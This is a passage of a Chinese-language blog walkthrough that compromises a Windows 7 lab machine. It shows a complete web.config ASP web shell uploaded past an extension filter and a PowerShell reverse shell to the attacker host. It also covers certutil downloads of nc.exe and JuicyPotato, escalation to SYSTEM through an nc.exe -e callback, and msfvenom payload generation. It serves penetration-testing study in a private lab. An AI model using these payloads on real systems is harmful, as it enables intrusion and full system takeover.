<span class="pl-s">49153/tcp open  unknown</span>
<span class="pl-s">49154/tcp open  unknown</span>
<span class="pl-s">49155/tcp open  unknown</span>
<span class="pl-s">49156/tcp open  unknown</span>
<span class="pl-s">49157/tcp open  unknown</span>
<span class="pl-s">MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)</span>
<span class="pl-s"></span>
<span class="pl-s">Host script results:</span>
<span class="pl-s">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span>
<span class="pl-s">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span>
<span class="pl-s">|_smb-vuln-ms10-054: false</span>
<span class="pl-s"></span>
<span class="pl-s">Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds</span>
<span class="pl-s">                                              </span></pre></div>
<p>目前为止，感兴趣的端口有 <strong>80</strong>、<strong>445，</strong>  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点</p>
<hr>
<h1>2.踩点</h1>
<h2>2.1 port 445</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span> --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [<span class="pl-k">*</span>] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E<span class="pl-cce">\g</span>uest: STATUS_LOGON_FAILURE 
                                                                                                    </pre></div>
<p>它没有开放访客登录，所以可以直接去观察80端口了</p>
<h2>2.2 port 80</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster <span class="pl-k">in</span> directory enumeration mode
===============================================================
/<span class="pl-k">*</span>checkout<span class="pl-k">*</span>.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/<span class="pl-k">*</span>docroot<span class="pl-k">*</span>.aspx       (Status: 400) [Size: 20]
/<span class="pl-k">*</span>.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/<span class="pl-k">**</span>http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/<span class="pl-k">*</span>http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[<span class="pl-k">!</span>] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================
</pre></div>
<p>扫到一个<code class="notranslate">/zoc.aspx</code>，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径<code class="notranslate">/Subiditosdetono/</code>，当我们把目录加入网址会看到如下内容</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815"><img src="https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815" alt="image" style="max-width: 100%;"></a></p>
<p>我们可以看到有一个<code class="notranslate">config</code>文件，当我们点击时会发现<strong>404</strong>无法访问，那我们还是回上传页试试能不能上传<strong>shell</strong></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2"><img src="https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2" alt="image" style="max-width: 100%;"></a></p>
<p>不允许我们上传<code class="notranslate">.aspx</code>后缀的文件，根据之前访问<code class="notranslate">/Subiditosdetono/</code>看到有<code class="notranslate">config</code>文件，我们可以从中知道，可以上传<code class="notranslate">config</code>文件，我们去<a href="https://book.hacktricks.xyz/" rel="nofollow">hacktricks</a>搜索一下看<code class="notranslate">config</code>文件可不可以做<code class="notranslate">shell</code></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd"><img src="https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd" alt="image" style="max-width: 100%;"></a></p>
<p>找到了一点有意思的东西，我们把它的示例<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config">复制</a>下来，上传运行</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> encoding=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">?</span><span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>configuration<span class="pl-k">&gt;</span>
   <span class="pl-k">&lt;</span>system.webServer<span class="pl-k">&gt;</span>
      <span class="pl-k">&lt;</span>handlers accessPolicy=<span class="pl-s"><span class="pl-pds">"</span>Read, Script, Write<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
         <span class="pl-k">&lt;</span>add name=<span class="pl-s"><span class="pl-pds">"</span>web_config<span class="pl-pds">"</span></span> path=<span class="pl-s"><span class="pl-pds">"</span>*.config<span class="pl-pds">"</span></span> verb=<span class="pl-s"><span class="pl-pds">"</span>*<span class="pl-pds">"</span></span> modules=<span class="pl-s"><span class="pl-pds">"</span>IsapiModule<span class="pl-pds">"</span></span> scriptProcessor=<span class="pl-s"><span class="pl-pds">"</span>%windir%\system32\inetsrv\asp.dll<span class="pl-pds">"</span></span> resourceType=<span class="pl-s"><span class="pl-pds">"</span>Unspecified<span class="pl-pds">"</span></span> requireAccess=<span class="pl-s"><span class="pl-pds">"</span>Write<span class="pl-pds">"</span></span> preCondition=<span class="pl-s"><span class="pl-pds">"</span>bitness64<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>       
      <span class="pl-k">&lt;</span>/handlers<span class="pl-k">&gt;</span>
      <span class="pl-k">&lt;</span>security<span class="pl-k">&gt;</span>
         <span class="pl-k">&lt;</span>requestFiltering<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>fileExtensions<span class="pl-k">&gt;</span>
               <span class="pl-k">&lt;</span>remove fileExtension=<span class="pl-s"><span class="pl-pds">"</span>.config<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>/fileExtensions<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>hiddenSegments<span class="pl-k">&gt;</span>
               <span class="pl-k">&lt;</span>remove segment=<span class="pl-s"><span class="pl-pds">"</span>web.config<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
            <span class="pl-k">&lt;</span>/hiddenSegments<span class="pl-k">&gt;</span>
         <span class="pl-k">&lt;</span>/requestFiltering<span class="pl-k">&gt;</span>
      <span class="pl-k">&lt;</span>/security<span class="pl-k">&gt;</span>
   <span class="pl-k">&lt;</span>/system.webServer<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>/configuration<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span><span class="pl-k">!</span>--
<span class="pl-k">&lt;</span>% Response.write(<span class="pl-s"><span class="pl-pds">"</span>-<span class="pl-pds">"</span></span><span class="pl-k">&amp;</span><span class="pl-s"><span class="pl-pds">"</span>-&gt;<span class="pl-pds">"</span></span>)%<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>%
Set oScript = Server.CreateObject(<span class="pl-s"><span class="pl-pds">"</span>WSCRIPT.SHELL<span class="pl-pds">"</span></span>)
Set oScriptNet = Server.CreateObject(<span class="pl-s"><span class="pl-pds">"</span>WSCRIPT.NETWORK<span class="pl-pds">"</span></span>)
Set oFileSys = Server.CreateObject(<span class="pl-s"><span class="pl-pds">"</span>Scripting.FileSystemObject<span class="pl-pds">"</span></span>)

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject(<span class="pl-s"><span class="pl-pds">"</span>WScript.Shell<span class="pl-pds">"</span></span>)
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%<span class="pl-k">&gt;</span>

<span class="pl-k">&lt;</span>BODY<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>FORM action=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> method=<span class="pl-s"><span class="pl-pds">"</span>GET<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span> size=45 value=<span class="pl-s"><span class="pl-pds">"</span>&lt;%= szCMD %&gt;<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span> value=<span class="pl-s"><span class="pl-pds">"</span>Run<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>/FORM<span class="pl-k">&gt;</span>

<span class="pl-k">&lt;</span>PRE<span class="pl-k">&gt;</span>
<span class="pl-k">&lt;</span>%= <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span><span class="pl-pds">"</span></span> <span class="pl-k">&amp;</span> oScriptNet.ComputerName <span class="pl-k">&amp;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\"</span> &amp; oScriptNet.UserName %&gt;</span>
<span class="pl-s">&lt;%Response.Write(Request.ServerVariables(<span class="pl-pds">"</span></span>server_name<span class="pl-s"><span class="pl-pds">"</span>))%&gt;</span>
<span class="pl-s">&lt;p&gt;</span>
<span class="pl-s">&lt;b&gt;The server's port:&lt;/b&gt;</span>
<span class="pl-s">&lt;%Response.Write(Request.ServerVariables(<span class="pl-pds">"</span></span>server_port<span class="pl-s"><span class="pl-pds">"</span>))%&gt;</span>
<span class="pl-s">&lt;/p&gt;</span>
<span class="pl-s">&lt;p&gt;</span>
<span class="pl-s">&lt;b&gt;The server's software:&lt;/b&gt;</span>
<span class="pl-s">&lt;%Response.Write(Request.ServerVariables(<span class="pl-pds">"</span></span>server_software<span class="pl-s"><span class="pl-pds">"</span>))%&gt;</span>
<span class="pl-s">&lt;/p&gt;</span>
<span class="pl-s">&lt;p&gt;</span>
<span class="pl-s">&lt;b&gt;The server's software:&lt;/b&gt;</span>
<span class="pl-s">&lt;%Response.Write(Request.ServerVariables(<span class="pl-pds">"</span></span>LOCAL_ADDR<span class="pl-s"><span class="pl-pds">"</span>))%&gt;</span>
<span class="pl-s">&lt;% szCMD = request(<span class="pl-pds">"</span></span>cmd<span class="pl-s"><span class="pl-pds">"</span>)</span>
<span class="pl-s">thisDir = getCommandOutput(<span class="pl-pds">"</span></span>cmd /c<span class="pl-s"><span class="pl-pds">"</span> &amp; szCMD)</span>
<span class="pl-s">Response.Write(thisDir)%&gt;</span>
<span class="pl-s">&lt;/p&gt;</span>
<span class="pl-s">&lt;br&gt;</span>
<span class="pl-s">&lt;/BODY&gt;</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">&lt;%Response.write(<span class="pl-pds">"</span></span><span class="pl-k">&lt;</span><span class="pl-k">!</span>-<span class="pl-s"><span class="pl-pds">"</span>&amp;<span class="pl-pds">"</span></span>-<span class="pl-s"><span class="pl-pds">"</span>) %&gt;</span>
<span class="pl-s">--&gt;</span>
<span class="pl-s">        </span></pre></div>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc"><img src="https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc" alt="image" style="max-width: 100%;"></a></p>
<p>弹个<strong>shell</strong>回来</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">powershell -nop -c <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$client</span> = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);<span class="pl-smi">$stream</span> = <span class="pl-smi">$client</span>.GetStream();[byte[]]<span class="pl-smi">$bytes</span> = 0..65535|%{0};while((<span class="pl-smi">$i</span> = <span class="pl-smi">$stream</span>.Read(<span class="pl-smi">$bytes</span>, 0, <span class="pl-smi">$bytes</span>.Length)) -ne 0){;<span class="pl-smi">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="pl-smi">$bytes</span>,0, <span class="pl-smi">$i</span>);<span class="pl-smi">$sendback</span> = (iex <span class="pl-smi">$data</span> 2&gt;&amp;1 | Out-String );<span class="pl-smi">$sendback2</span> = <span class="pl-smi">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="pl-smi">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="pl-smi">$sendback2</span>);<span class="pl-smi">$stream</span>.Write(<span class="pl-smi">$sendbyte</span>,0,<span class="pl-smi">$sendbyte</span>.Length);<span class="pl-smi">$stream</span>.Flush()};<span class="pl-smi">$client</span>.Close()<span class="pl-pds">"</span></span>

<span class="pl-c"><span class="pl-c">#</span>攻击机</span>
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e<span class="pl-cce">\i</span>nfo</pre></div>
<hr>
<h1>3.提权</h1>
<p>拿到<strong>shell</strong>后看看权限</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">PS C:<span class="pl-cce">\u</span>sers<span class="pl-cce">\i</span>nfo<span class="pl-k">&gt;</span> whoami /priv

INFORMACI<span class="pl-k">?</span>N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci<span class="pl-k">?</span>n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci<span class="pl-k">?</span>n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci<span class="pl-k">?</span>n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
</pre></div>
<p>我们有 <code class="notranslate">SeImpersonatePrivilege</code>权限，所以我们可以使用 <strong><a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a></strong> 工具来提升权限。</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7"><img src="https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7" alt="image" style="max-width: 100%;"></a></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">PS C:<span class="pl-cce">\t</span>mp<span class="pl-k">&gt;</span> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
<span class="pl-k">****</span>  En l<span class="pl-k">?</span>nea  <span class="pl-k">****</span>
  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.
PS C:<span class="pl-cce">\t</span>mp<span class="pl-k">&gt;</span> dir


    Directorio: C:<span class="pl-cce">\t</span>mp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:19      59392 nc.exe                          


PS C:<span class="pl-cce">\t</span>mp<span class="pl-k">&gt;</span> certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
<span class="pl-k">****</span>  En l<span class="pl-k">?</span>nea  <span class="pl-k">****</span>
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
PS C:<span class="pl-cce">\t</span>mp<span class="pl-k">&gt;</span> dir


    Directorio: C:<span class="pl-cce">\t</span>mp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
-a---        02/01/2025     15:19      59392 nc.exe                          


</pre></div>
<p>先将<code class="notranslate">JuicyPotato.exe</code>和<code class="notranslate">nc.exe</code>传上目标机器</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">./JuicyPotato.exe -t <span class="pl-k">*</span> -p C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\S</span>ystem32<span class="pl-cce">\c</span>md.exe -l 1337 -a <span class="pl-s"><span class="pl-pds">"</span>/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567<span class="pl-pds">"</span></span> -c <span class="pl-s"><span class="pl-pds">"</span>{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}<span class="pl-pds">"</span></span></pre></div>
<p>运行<code class="notranslate">JuicyPotato.exe</code></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─$ nc -lvnp 4567    
listening on [any] 4567 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span>whoami
whoami
nt authority<span class="pl-cce">\s</span>ystem
</pre></div>
<p>成功拿到<strong>system</strong>权限</p>
<hr>
<h1>4.总结</h1>
<p>在<code class="notranslate">BerserkWings</code>、<code class="notranslate">ll104567</code>大佬那学了点技术[笑脸]</p>
<h2>4.1 分析 SMB 服务</h2>
<p><strong>检查域</strong>、<strong>操作系统版本</strong>、<strong>是否可以访客登录</strong>等</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ crackmapexec smb 192.168.205.221
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [<span class="pl-k">*</span>] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221                    
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [<span class="pl-k">*</span>] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
                          </pre></div>
<p>列出与 <strong>smblcient</strong> 共享的文件</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.221// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 <span class="pl-k">for</span> workgroup listing.
do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available                                                         </pre></div>
<p>自动化脚本</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ smbmap -H 192.168.205.221        

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="pl-s"><span class="pl-pds">"</span>       )|<span class="pl-pds">"</span></span>  <span class="pl-cce">\ </span>   /<span class="pl-s"><span class="pl-pds">"</span>  ||   _  <span class="pl-pds">"</span></span><span class="pl-cce">\ </span><span class="pl-k">|</span><span class="pl-s"><span class="pl-pds">"</span>  \    /<span class="pl-pds">"</span></span>  <span class="pl-k">|</span>     /<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span><span class="pl-cce">\ </span>      <span class="pl-k">|</span>   __ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\</span></span>
<span class="pl-s">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span>
<span class="pl-s">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/</span>
<span class="pl-s">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /</span>
<span class="pl-s">   /<span class="pl-pds">"</span></span> <span class="pl-cce">\ </span>  :) <span class="pl-k">|</span>.  <span class="pl-cce">\ </span>   /:  <span class="pl-k">||</span>: <span class="pl-k">|</span>_)  :)<span class="pl-k">|</span>.  <span class="pl-cce">\ </span>   /:  <span class="pl-k">|</span> /   /  <span class="pl-cce">\ </span>  <span class="pl-cce">\ </span> /<span class="pl-k">|</span>__/ \
  (_______/  <span class="pl-k">|</span>___<span class="pl-k">|</span><span class="pl-cce">\_</span>_/<span class="pl-k">|</span>___<span class="pl-k">|</span>(_______/ <span class="pl-k">|</span>___<span class="pl-k">|</span><span class="pl-cce">\_</span>_/<span class="pl-k">|</span>___<span class="pl-k">|</span>(___/    <span class="pl-cce">\_</span>__)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 <span class="pl-k">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[<span class="pl-k">*</span>] Detected 1 hosts serving SMB                                                                                                
[<span class="pl-k">*</span>] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
[<span class="pl-k">!</span>] Access denied on 192.168.205.221, no fun <span class="pl-k">for</span> you...                                                                
[<span class="pl-k">*</span>] Closed 1 connections                                                                                                   
                                  </pre></div>
<h2>4.2 windows常用命令</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 查看操作系统 （OS） 信息</span>
systeminfo
<span class="pl-c"><span class="pl-c">#</span> 查看拥有权限</span>
whoami /priv
<span class="pl-c"><span class="pl-c">#</span> 下载攻击机文件</span>
copy <span class="pl-cce">\\</span>192.168.205.141<span class="pl-cce">\n</span>c.exe <span class="pl-c1">.</span></pre></div>
<h2>4.3 msf</h2>
<p>生成<strong>shell</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: msf.exe
</pre></div>
<p>连接<strong>shell</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msf6 <span class="pl-k">&gt;</span> use exploit/multi/handler 
[<span class="pl-k">*</span>] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> payload windows/meterpreter/reverse_tcp
payload =<span class="pl-k">&gt;</span> windows/meterpreter/reverse_tcp</pre></div>
<p>自动化漏洞挖掘（要有msf的shell）</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msf6 <span class="pl-k">&gt;</span> post/multi/recon/local_exploit_suggester</pre></div></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.disabled=true;
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
